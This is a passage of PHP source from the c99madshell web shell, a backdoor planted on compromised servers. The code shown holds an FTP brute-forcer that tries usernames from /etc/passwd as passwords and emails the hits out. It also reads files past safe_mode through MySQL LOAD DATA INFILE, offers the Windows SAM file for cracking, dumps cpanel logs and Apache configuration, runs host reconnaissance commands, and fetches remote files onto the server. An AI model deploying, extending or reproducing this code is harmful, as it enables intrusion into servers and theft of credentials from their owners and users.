     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus")
    {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "&lt;center&gt;&lt;b&gt;Server-status variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;&lt;/center&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars")
    {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "&lt;center&gt;&lt;b&gt;Server variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "processes")
    {
     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "&lt;b&gt;Killing process #".$kill."... ok. he is dead, amen.&lt;/b&gt;";}
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "&lt;center&gt;&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;ID&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;USER&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;HOST&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;DB&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;COMMAND&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;TIME&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;STATE&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;INFO&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;td&gt;".$row[2]."&lt;/td&gt;&lt;td&gt;".$row[3]."&lt;/td&gt;&lt;td&gt;".$row[4]."&lt;/td&gt;&lt;td&gt;".$row[5]."&lt;/td&gt;&lt;td&gt;".$row[6]."&lt;/td&gt;&lt;td&gt;".$row[7]."&lt;/td&gt;&lt;td&gt;&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='processes';document.sql.kill.value='".$row[0]."';document.sql.submit();\"&gt;&lt;u&gt;Kill&lt;/u&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = FALSE;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "&lt;b&gt;Error in reading file (permision denied)!&lt;/b&gt;";}
      else
      {
       for ($i=0;$i&lt;mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("
",$row);}
       if (empty($f)) {echo "&lt;b&gt;File \"".$sql_getfile."\" does not exists or empty!&lt;/b&gt;&lt;br&gt;";}
       else {echo "&lt;b&gt;File \"".$sql_getfile."\":&lt;/b&gt;&lt;br&gt;".nl2br(htmlspecialchars($f))."&lt;br&gt;";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb); //comment it if you want to leave database
    }
   }
  }
 }
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 if ($sql_sock)
 {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected &lt; 0)){$affected = 0;}
  echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Affected rows: ".$affected."&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;";
 }
 echo "&lt;/table&gt;";
}
if ($act == "mkdir")
{
 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "&lt;b&gt;Make Dir \"".htmlspecialchars($mkdir)."\"&lt;/b&gt;: object alredy exists";}
  elseif (!mkdir($mkdir)) {echo "&lt;b&gt;Make Dir \"".htmlspecialchars($mkdir)."\"&lt;/b&gt;: access denied";}
  echo "&lt;br&gt;&lt;br&gt;";
 }
 $act = $dspact = "ls";
}
if ($act == "ftpquickbrute")
{
 echo "&lt;b&gt;Ftp Quick brute:&lt;/b&gt;&lt;br&gt;";
 if (!win) {echo "This functions not work in Windows!&lt;br&gt;&lt;br&gt;";}
 else
 {
  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
   if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}
   else {$TRUE = TRUE;}
   if ($TRUE)
   {
    $sock = @ftp_connect($host,$port,$timeout);
    if (@ftp_login($sock,$login,$pass))
    {
     echo "&lt;a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"&gt;&lt;b&gt;Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"&lt;/b&gt;&lt;/a&gt;.&lt;br&gt;";
     ob_flush();
     return TRUE;
    }
   }
  }
  if (!empty($submit))
  {
   if (isset($_POST['fqb_lenght'])) $fqb_lenght = $_POST['fqb_lenght'];
   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
   $fp = fopen("/etc/passwd","r");
   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
   else
   {
    if (isset($_POST['fqb_logging'])) $fqb_logging = $_POST['fqb_logging'];
    if ($fqb_logging)
    {
     if (isset($_POST['fqb_logfile'])) $fqb_logging = $_POST['fqb_logfile'];
     if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
     else {$fqb_logfp = FALSE;}
     $fqb_log = "FTP Quick Brute (called c99madshell v. ".$shver.") started at ".date("d.m.Y H:i:s")."

";
     if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    }
    ob_flush();
    $i = $success = 0;
    $ftpquick_st = getmicrotime();
    while(!feof($fp))
    {
     $str = explode(":",fgets($fp,2048));
     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
     {
      echo "&lt;b&gt;Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"&lt;/b&gt;&lt;br&gt;";
      $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."
";
      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      $success++;
      ob_flush();
     }
     if ($i &gt; $fqb_lenght) {break;}
     $i++;
    }
    if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!
";}
    $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
    echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Done!&lt;/b&gt;&lt;br&gt;Total time (secs.): ".$ftpquick_t."&lt;br&gt;Total connections: ".$i."&lt;br&gt;Success.: &lt;font color=green&gt;&lt;b&gt;".$success."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;Unsuccess.:".($i-$success)."&lt;/b&gt;&lt;br&gt;Connects per second: ".round($i/$ftpquick_t,2)."&lt;br&gt;";
    $fqb_log .= "
------------------------------------------
Done!
Total time (secs.): ".$ftpquick_t."
Total connections: ".$i."
Success.: ".$success."
Unsuccess.:".($i-$success)."
Connects per second: ".round($i/$ftpquick_t,2)."
";
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
  {
   $logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
   $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
   echo "&lt;form method=\"POST\"&gt;&lt;input type=hidden name=act value=\"ftpquickbrute\"&gt;&lt;br&gt;Read first: &lt;input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"&gt;&lt;br&gt;&lt;br&gt;Users only with shell?&nbsp;&lt;input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"&gt;&lt;br&gt;&lt;br&gt;Logging?&nbsp;&lt;input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked&gt;&lt;br&gt;Logging to file?&nbsp;&lt;input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"&gt;&lt;br&gt;Logging to e-mail?&nbsp;&lt;input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Brute\"&gt;&lt;/form&gt;";
  }
 }
}
if ($act == "d")
{
 if (!is_dir($d)) {echo "&lt;center&gt;&lt;b&gt;Permision denied!&lt;/b&gt;&lt;/center&gt;";}
 else
 {
  echo "&lt;b&gt;Directory information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;";
  if (!$win)
  {
   echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";
   $ow = posix_getpwuid(fileowner($d));
   $gr = posix_getgrgid(filegroup($d));
   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
  }
  echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;&lt;/a&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
 }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
if ($act == "security")
{
 echo "&lt;center&gt;&lt;b&gt;Server security information:&lt;/b&gt;&lt;/center&gt;&lt;b&gt;Open base dir: ".$hopenbasedir."&lt;/b&gt;&lt;br&gt;";
 if (!$win)
 {
  if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   echo "&lt;b&gt;*nix /etc/passwd:&lt;/b&gt;&lt;br&gt;";
   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
   if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
   echo "&lt;form method=\"POST\"&gt;&lt;input type=hidden name=act value=\"security\"&gt;&lt;input type=hidden name=\"nixpasswd\" value=\"1\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\"&gt;&nbsp;&lt;input type=submit value=\"View\"&gt;&lt;/form&gt;&lt;br&gt;";
   $i = $nixpwd_s;
   while ($i &lt; $nixpwd_e)
   {
    $uid = posix_getpwuid($i);
    if ($uid)
    {
     $uid["dir"] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($uid["dir"])."';document.todo.submit();\"&gt;".$uid["dir"]."&lt;/a&gt;";
     echo join(":",$uid)."&lt;br&gt;";
    }
    $i++;
   }
  }
  else {echo "&lt;br&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='security';document.todo.d.value='".$ud."';document.todo.nixpasswd.value='1';document.todo.submit();\"&gt;&lt;b&gt;&lt;u&gt;Get /etc/passwd&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
 }
 else
 {
  $v = $_SERVER["WINDIR"]."
epair\sam";
  if (file_get_contents($v)) {echo "&lt;b&gt;&lt;font color=red&gt;You can't crack winnt passwords(".$v.") &lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
  else {echo "&lt;b&gt;&lt;font color=green&gt;You can crack winnt passwords. &lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='sam';document.todo.d.value='".$_SERVER["WINDIR"]."\/repair';document.todo.ft.value='download';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;, and use lcp.crack+ .&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 }
 if (file_get_contents("/etc/userdomains")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='userdomains';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;View cpanel user-domains logs&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/var/cpanel/accounting.log")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='accounting.log';document.todo.d.value='".urlencode("/var/cpanel/")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;View cpanel logs&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='httpd.conf';document.todo.d.value='".urlencode("/usr/local/apache/conf")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;Apache configuration (httpd.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/etc/httpd.conf")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='httpd.conf';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;Apache configuration (httpd.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/etc/syslog.conf")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='syslog.conf';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;Syslog configuration (syslog.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/etc/motd")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='motd';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;Message Of The Day&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/etc/hosts")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='hosts';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"&gt;&lt;u&gt;&lt;b&gt;Hosts&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "&lt;b&gt;".$name." - &lt;/b&gt;";} echo $name.nl2br($value)."&lt;br&gt;";}}
 displaysecinfo("OS Version?",myshellexec("cat /proc/version"));
 displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));
 displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));
 displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise"));
 displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo"));
 displaysecinfo("RAM",myshellexec("free -m"));
 displaysecinfo("HDD space",myshellexec("df -h"));
 displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
 displaysecinfo("Mount options ",myshellexec("cat /etc/fstab"));
 displaysecinfo("Is cURL installed?",myshellexec("which curl"));
 displaysecinfo("Is lynx installed?",myshellexec("which lynx"));
 displaysecinfo("Is links installed?",myshellexec("which links"));
 displaysecinfo("Is fetch installed?",myshellexec("which fetch"));
 displaysecinfo("Is GET installed?",myshellexec("which GET"));
 displaysecinfo("Is perl installed?",myshellexec("which perl"));
 displaysecinfo("Where is apache",myshellexec("whereis apache"));
 displaysecinfo("Where is perl?",myshellexec("whereis perl"));
 displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf"));
 displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf"));
 displaysecinfo("locate my.conf",myshellexec("locate my.conf"));
 displaysecinfo("locate psybnc.conf",myshellexec("locate psybnc.conf"));
}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "&lt;b&gt;Make File \"".htmlspecialchars($mkfile)."\"&lt;/b&gt;: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "&lt;b&gt;Make File \"".htmlspecialchars($mkfile)."\"&lt;/b&gt;: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}
if ($act == "fsbuff")
{
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
 if (count($arr) == 0) {echo "&lt;center&gt;&lt;b&gt;Buffer is empty!&lt;/b&gt;&lt;/center&gt;";}
 else {echo "&lt;b&gt;File-System buffer&lt;/b&gt;&lt;br&gt;&lt;br&gt;"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";}
}
if ($act == "selfremove")
{
 if (($submit == $rndcode) and ($submit != ""))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99madshell v.".$shver."!"; c99shexit(); }
  else {echo "&lt;center&gt;&lt;b&gt;Can't delete ".__FILE__."!&lt;/b&gt;&lt;/center&gt;";}
 }
 else
 {
  if (!empty($rndcode)) {echo "&lt;b&gt;Error: incorrect confimation!&lt;/b&gt;";}
  $rnd = rand(0,9).rand(0,9).rand(0,9);
  echo "&lt;form method=\"POST\"&gt;&lt;input type=hidden name=act value=selfremove&gt;&lt;b&gt;Self-remove: ".__FILE__." &lt;br&gt;&lt;b&gt;Are you sure?&lt;br&gt;For confirmation, enter \"".$rnd."\"&lt;/b&gt;:&nbsp;&lt;input type=hidden name=rndcode value=\"".$rnd."\"&gt;&lt;input type=text name=submit&gt;&nbsp;&lt;input type=submit value=\"YES\"&gt;&lt;/form&gt;";
 }
}
if ($act == "search")
{
 echo "&lt;b&gt;Search in file-system:&lt;/b&gt;&lt;br&gt;";
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}
 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $search_i_f = 0;
  $search_i_d = 0;
  $a = array
  (
   "name"=&gt;$search_name, "name_regexp"=&gt;$search_name_regexp,
   "text"=&gt;$search_text, "text_regexp"=&gt;$search_text_regxp,
   "text_wwo"=&gt;$search_text_wwo,
   "text_cs"=&gt;$search_text_cs,
   "text_not"=&gt;$search_text_not
  );
  $searchtime = getmicrotime();
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v) {c99fsearch($v);}
  $searchtime = round(getmicrotime()-$searchtime,4);
  if (count($found) == 0) {echo "&lt;b&gt;No files found!&lt;/b&gt;";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = TRUE;
   $act = "ls";
  }
 }
 echo "&lt;form method=POST&gt;
&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;input type=hidden name=act value=\"".$dspact."\"&gt;
&lt;b&gt;Search for (file/folder name): &lt;/b&gt;&lt;input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\"&gt;&nbsp;&lt;input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."&gt; - regexp
&lt;br&gt;&lt;b&gt;Search in (explode \";\"): &lt;/b&gt;&lt;input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\"&gt;
&lt;br&gt;&lt;br&gt;&lt;b&gt;Text:&lt;/b&gt;&lt;br&gt;&lt;textarea name=\"search_text\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($search_text)."&lt;/textarea&gt;
&lt;br&gt;&lt;br&gt;&lt;input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."&gt; - regexp
&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."&gt; - &lt;u&gt;w&lt;/u&gt;hole words only
&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."&gt; - cas&lt;u&gt;e&lt;/u&gt; sensitive
&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."&gt; - find files &lt;u&gt;NOT&lt;/u&gt; containing the text
&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Search\"&gt;&lt;/form&gt;";
 if ($act == "ls") {$dspact = $act; echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).&lt;/b&gt;&lt;br&gt;&lt;br&gt;";}
}
if ($act == "chmod")
{
 $mode = fileperms($d.$f);
 if (!$mode) {echo "&lt;b&gt;Change file-mode with error:&lt;/b&gt; can't get current value.";}
 else
 {
  $form = TRUE;
  if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "&lt;b&gt;Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")&lt;/b&gt;&lt;br&gt;".($err?"&lt;b&gt;Error:&lt;/b&gt; ".$err:"")."&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=d value=\"".htmlspecialchars($d)."\"&gt;&lt;input type=hidden name=f value=\"".htmlspecialchars($f)."\"&gt;&lt;input type=hidden name=act value=chmod&gt;&lt;table align=left width=300 border=0 cellspacing=0 cellpadding=5&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"")."&gt;eXecute&lt;/td&gt;&lt;td&gt;&lt;b&gt;Group&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;World&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=submit name=chmod_submit value=\"Save\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;";
  }
 }
}
if ($act == "upload")
{
 $uploadmess = "";
 $uploadpath = str_replace("\",DIRECTORY_SEPARATOR,$uploadpath);
 if (empty($uploadpath)) {$uploadpath = $d;}
 elseif (substr($uploadpath,-1) != "/") {$uploadpath .= "/";}
 if (!empty($submit))
 {
  global $HTTP_POST_FILES;
  $uploadfile = $HTTP_POST_FILES["uploadfile"];
  if (!empty($uploadfile["tmp_name"]))
  {
   if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
   else {$destin = $userfilename;}
   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!&lt;br&gt;";}
  }
  elseif (!empty($uploadurl))
  {
   if (!empty($uploadfilename)) {$destin = $uploadfilename;}
   else
   {
    $destin = explode("/",$destin);
    $destin = $destin[count($destin)-1];
    if (empty($destin))
    {
     $i = 0;
     $b = "";
     while(file_exists($uploadpath.$destin)) {if ($i &gt; 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
   }
   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "&lt;b&gt;Incorect url!&lt;/b&gt;&lt;br&gt;";}
   else
   {
    $st = getmicrotime();
    $content = @file_get_contents($uploadurl);
    $dt = round(getmicrotime()-$st,4);
    if (!$content) {$uploadmess .=  "Can't download file!&lt;br&gt;";}
    else
    {
     if ($filestealth) {$stat = stat($uploadpath.$destin);}
     $fp = fopen($uploadpath.$destin,"w");
